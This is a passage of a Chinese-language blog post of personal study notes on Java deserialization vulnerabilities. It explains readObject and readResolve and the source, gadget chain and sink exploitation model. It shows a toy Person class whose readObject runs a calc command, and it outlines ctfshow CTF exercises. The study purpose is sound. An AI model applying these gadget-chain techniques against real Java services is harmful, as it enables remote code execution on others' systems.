@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Java反序列化学习参考资料 [Java-序列化和反序列化-学习笔记](https:&#x2F;&#x2F;github.com&#x2F;bfengj&#x2F;CTF&#x2F;blob&#x2F;main&#x2F;Web&#x2F;java&#x2F;Java%E5%9F%BA%E7%A1%80&#x2F;- Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化学习（1）">
+<meta property="og:url" content="http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="Java反序列化学习参考资料 [Java-序列化和反序列化-学习笔记](https:&#x2F;&#x2F;github.com&#x2F;bfengj&#x2F;CTF&#x2F;blob&#x2F;main&#x2F;Web&#x2F;java&#x2F;Java%E5%9F%BA%E7%A1%80&#x2F;- Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-14T16:16:33.000Z">
+<meta property="article:modified_time" content="2025-02-26T16:02:54.485Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java反序列化学习（1）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/10/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-SSRF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=Java反序列化学习（1）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java反序列化学习（1）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化学习（1）&body=Check out this article: http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java反序列化学习（1）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=Java反序列化学习（1）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=Java反序列化学习（1）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Java反序列化学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.1.</span> <span class="toc-text">参考资料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%B1%BB%EF%BC%88%E8%BF%99%E6%AE%B5%E5%85%A8%E6%98%AF%E6%91%98%E6%8A%84%E7%9A%84%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">重要接口和类（这段全是摘抄的）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8F%AF%E8%83%BD%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">Java反序列化的可能利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%85%B1%E5%90%8C%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">Java反序列化漏洞利用共同的条件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%85%A5%E5%8F%A3%E7%B1%BBreadObject%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">简单案例：入口类readObject直接调用危险方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B2%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%88%E4%BB%A5URLDNS%E9%93%BE%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">案例2：序列化过程中的问题（以URLDNS链为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">反射在反序列化漏洞中的应用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0-ctfshow-web%E5%85%A5%E9%97%A8-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">例题学习: ctfshow-web入门 Java反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web846"><span class="toc-number">2.1.</span> <span class="toc-text">web846</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web847"><span class="toc-number">2.2.</span> <span class="toc-text">web847</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%92%8C%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">附录和一些基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84"><span class="toc-number">3.1.</span> <span class="toc-text">Java 反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84-%E6%A6%82%E5%BF%B5-Powered-By-GPT"><span class="toc-number">3.1.1.</span> <span class="toc-text">Java 反射 概念 Powered By GPT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">Java 反射 例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">Java 动态代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">Java 静态代理 例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">Java 动态代理 例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">动态代理在反序列化漏洞中的运用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">Java 类加载机制和对象创建过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.1.</span> <span class="toc-text">类加载机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD-file-http-jar"><span class="toc-number">3.3.2.</span> <span class="toc-text">URLClassLoader实现任意类加载 file&#x2F;http&#x2F;jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader-defineClass%E5%AE%9E%E7%8E%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB-%EF%BC%88%E4%B8%8D%E9%9C%80%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">3.3.3.</span> <span class="toc-text">ClassLoader.defineClass实现字节码加载任意类 （不需出网）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-defineClass%E5%AE%9E%E7%8E%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB-%EF%BC%88%E4%B8%8D%E9%9C%80%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">3.3.4.</span> <span class="toc-text">Unsafe.defineClass实现字节码加载任意类 （不需出网）</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java反序列化学习（1）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-14T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-05-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Java反序列化学习"><a href="#Java反序列化学习" class="headerlink" title="Java反序列化学习"></a>Java反序列化学习</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><p>[Java-序列化和反序列化-学习笔记](<a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/-">https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/-</a> Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0)</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43842093/article/details/127437652">Serializable序列化和Externalizable序列化与反序列化的使用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://geeknote.net/wick/posts/2429">深入理解Java中的序列化和反序列化</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9">Java反序列化漏洞专题（视频教程）</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13772184.html">URLDNS分析</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1215712">URLDNS分析2</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/135111050">ysoserial的使用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0x7e/p/14311904.html">IDEA运行ysoserial</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://lenjor.github.io/2020/12/Linux-Java-JDK-install/">Linux配置多个Java环境</a> 不得不说，kali里面的update-alternatives真好用</p>
+</li>
+</ul>
+<h3 id="重要接口和类（这段全是摘抄的）"><a href="#重要接口和类（这段全是摘抄的）" class="headerlink" title="重要接口和类（这段全是摘抄的）"></a>重要接口和类（这段全是摘抄的）</h3><ul>
+<li><strong>Serializable</strong><br>这是一个空接口，实现了这个接口的类可以进行序列化&#x2F;反序列化。</li>
+</ul>
+<p>这个对象的所有属性（包括private属性、包括其引用的对象）都可以被序列化和反序列化来保存、传递。不想序列化的字段可以使用transient修饰。</p>
+<p>由于Serializable对象完全以它存储的二进制位为基础来构造，因此<strong>并不会调用任何构造函数</strong>，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。</p>
+<p>使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。</p>
+<p>如果一个对象既不是字符串、数组、枚举，而且也没有实现Serializable接口的话，在序列化时就会抛出NotSerializableException异常。原来<strong>Serializable接口仅仅只是做一个标记用</strong>，它告诉代码只要是实现了Serializable接口的类都是可以被序列化的！然而真正的序列化动作不需要靠它完成。</p>
+<p>注意：被static和transient修饰的字段是不会被序列化的。 </p>
+<ul>
+<li><strong>Externalizable</strong><br>这是一个继承自Serializable接口的接口，用户需实现writeExternal()和readExternal() 方法，用来决定如何序列化和反序列化。</li>
+</ul>
+<blockquote>
+<p>因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。</p>
+</blockquote>
+<blockquote>
+<p>readExternal(),writeExternal()两个方法，这两个方法除了方法签名和readObject(),writeObject()两个方法的方法签名不同之外，其方法体完全一样。</p>
+</blockquote>
+<p>需要指出的是，当使用Externalizable机制反序列化该对象时，程序会使用public的无参构造器创建实例，然后才执行readExternal()方法进行反序列化，因此实现Externalizable的序列化类必须提供public的无参构造。</p>
+<ul>
+<li><p><strong>readObject</strong><br><code>readObject()</code> 方法：</p>
+<ul>
+<li>在自定义序列化时，您可以在类中定义 <code>readObject()</code> 方法。</li>
+<li>当对象从流中反序列化时，<code>readObject()</code> 方法会被调用，用于读取对象的属性并恢复其状态。</li>
+<li>在 <code>readObject()</code> 方法中，您可以使用 <code>ObjectInputStream</code> 提供的 <code>readXXX</code> 方法来读取类的属性。</li>
+<li>请注意，读取属性的顺序必须与 <code>writeObject()</code> 方法中写入属性的顺序相同。</li>
+</ul>
+</li>
+<li><p><strong>writeObject</strong></p>
+<ul>
+<li>在自定义序列化时，您可以在类中定义 <code>writeObject()</code> 方法。</li>
+<li>当对象被序列化时，<code>writeObject()</code> 方法会被调用，用于将对象的属性写入流。</li>
+<li>在 <code>writeObject()</code> 方法中，您可以使用 <code>ObjectOutputStream</code> 提供的 <code>writeXXX</code> 方法来写入类的属性。</li>
+</ul>
+</li>
+<li><p><strong>ObjectOutputStream</strong><br><code>java.io.ObjectOutputStream</code> 是实现序列化的关键类，它可以将一个对象转换成二进制流，然后通过 <code>ObjectInputStream</code> 将二进制流还原成对象。</p>
+</li>
+<li><p><strong>ObjectInputStream</strong><br><code>java.io.ObjectInputStream</code> 是实现Java反序列化的关键类，和 <code>ObjectOutputStream</code> 是对应的。</p>
+</li>
+<li><p><strong>writeReplace</strong><br><code>writeReplace</code> 方法用于序列化写入时拦截并替换成一个自定义的对象。这个方法也是在 <code>ObjectStreamClass</code> 类中被反射获取的</p>
+</li>
+</ul>
+<p>如果定义了<code>writeReplace</code>方法，就没必要再定义<code>writeObject</code>方法了。即使定义了<code>writeObject</code>方法，该方法也不会被调用，内部会先调用<code>writeReplace</code>方法将当前序列化对象替换成自定义目标对象。同理，也没必要定义<code>readObject</code>方法，即使定义了也不会被调用。</p>
+<ul>
+<li><strong>readReplace</strong></li>
+</ul>
+<p><code>readResolve</code> 方法：<br>    用于在对象从流中读取后进行解析。<br>    典型用途是处理单例模式。当对象被读取时，可以将其替换为单例实例。这样可以确保通过序列化和反序列化单例对象，不会创建其他实例。<br>    示例：如果一个对象包含一个可以从现有数据重新创建的缓存，而不需要序列化该缓存，可以将缓存字段声明为 <code>transient</code>，然后在 <code>readResolve()</code> 中重新构建它。<br><code>readReplace</code> 方法：<br>    用于替换从流中读取的对象。<br>    当对象被读取时，可以将其替换为其他对象。<br>    典型用途是在序列化代理中使用，以便在读取对象时返回不同的实例。<br>    示例：您可以在 <code>readReplace</code> 中返回一个代理对象，以便在反序列化时返回不同的实例。<br>总之，<code>readResolve</code> 主要用于解析对象，而 <code>readReplace</code> 主要用于替换对象。如果您有更多问题，欢迎继续提问！</p>
+<p><code>readResolve</code>方法用于反序列化拦截并替换成自定义的对象。但和<code>writeReplace</code>方法不同的是，如果定义了<code>readResolve</code>方法，<code>readObject</code>方法是允许出现的。同样的，<code>readResolve</code> 方法也是在 <code>ObjectStreamClass</code> 类中被反射获取的。</p>
+<p><code>readResolve</code>方法的工作原理为：<br>    - 首先调用<code>readObject0</code>方法得到反序列化结果。<br>    - 如果<code>readResolve</code>方法存在，则会调用该方法返回自定义的对象。<br>    - 将自定义的对象作为<code>ObjectInputStream</code>的<code>readObject</code>的返回值。</p>
+<p><a target="_blank" rel="noopener" href="https://geeknote.net/wick/posts/2429#4.3+%E4%B8%A4%E7%A7%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E5%BC%8F%E7%9A%84%E6%AF%94%E8%BE%83"><code>readResolve</code>方法的示例</a></p>
+<ul>
+<li><strong>SealedObject SignedObject</strong><br>通过加解密的方式来保护序列化安全</li>
+</ul>
+<h2 id="Java反序列化的可能利用方式"><a href="#Java反序列化的可能利用方式" class="headerlink" title="Java反序列化的可能利用方式"></a>Java反序列化的可能利用方式</h2><ol>
+<li>入口类readObject直接调用危险方法；</li>
+<li>入口类参数中包含可控类，该类有危险方法，readObject时会调用；</li>
+<li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时会调用；</li>
+<li>构造函数&#x2F;静态代码块等类加载时隐式执行。</li>
+</ol>
+<h3 id="Java反序列化漏洞利用共同的条件："><a href="#Java反序列化漏洞利用共同的条件：" class="headerlink" title="Java反序列化漏洞利用共同的条件："></a>Java反序列化漏洞利用共同的条件：</h3><blockquote>
+<p>总体而言，“就是找能调用危险方法的类，然后符合条件的入口类，这就是尾和头，然后通过层层类的调用将头和尾串联起来闭合”</p>
+</blockquote>
+<ol>
+<li>需要继承Serializable</li>
+<li><strong>入口类（source）</strong>：需要重写readObject，最好参数类型宽泛，或者是jdk自带的类。</li>
+<li><strong>调用链（gadget chain）</strong>：根据相同名称、相同类型的各种类和接口不停地调用。</li>
+<li><strong>执行类（sink）</strong>：rce、ssrf或者写文件</li>
+</ol>
+<p>如：</p>
+<blockquote>
+<p>Map&lt;Object, object&gt; </p>
+</blockquote>
+<blockquote>
+<p>HashMap&lt;Object, object&gt;  HashTable&lt;Object, object&gt; </p>
+</blockquote>
+<ol start="2">
+<li><strong>入口类（source）</strong>：需要重写readObject，最好参数类型宽泛，或者是jdk自带的类。</li>
+</ol>
+<h3 id="简单案例：入口类readObject直接调用危险方法"><a href="#简单案例：入口类readObject直接调用危险方法" class="headerlink" title="简单案例：入口类readObject直接调用危险方法"></a>简单案例：入口类readObject直接调用危险方法</h3><p>Person.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;serserser&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>SerializeTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;AA&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        